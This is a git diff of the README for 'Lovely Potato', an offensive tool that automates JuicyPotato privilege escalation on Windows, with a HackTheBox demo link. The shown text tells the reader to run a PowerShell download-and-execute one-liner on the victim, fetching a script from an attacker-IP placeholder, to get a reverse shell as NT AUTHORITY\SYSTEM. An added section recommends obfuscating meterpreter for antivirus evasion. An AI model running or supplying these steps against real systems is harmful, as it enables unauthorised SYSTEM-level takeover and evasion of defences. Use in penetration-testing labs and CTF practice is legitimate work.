@@ -25,10 +25,22 @@ On a new terminal, launch metasploit console (or any listener which handles what
 root@attacker:~# msfdb run
 msf5 > # I'm going to omit setting up the multi handler as it is something you should already know
 ```
-Finally enter below command on victim's powershell console and wait 5 minutes for reverse shell running as user NT AUTHORITY\SYSTEM!!
+Finally enter below command on victim's powershell console and wait 5 minutes for reverse shell running as user NT AUTHORITY\SYSTEM!
 ```
 PS > IEX(New-Object Net.WebClient).DownloadString('http://[AttackerIP]/Invoke-LovelyPotato.ps1')
 ```
+
+## Why Use Lovely Potato?
+*For simplicity.*
+Manually uploading various files to target host can be easily avoided with automation.
+Also, listing entire CLSIDs on the system and identifying privilege for each of them takes very long time if done by sending commands.
+You can easily switch binaries in the repo any time without having to recode Invoke-LovelyPotato.ps1.
+Ex) Recompiling JuicyPotato for customization / Obfuscating your meterpreter for AV evasion
+
+## Demo
+Setting up & Testing Lovely Potato against HackTheBox machine (starting at 6:43)
+https://youtu.be/f-JDU0GlRIw?t=403
+
 
 [1]: https://github.com/ohpe/juicy-potato
 [2]: https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts
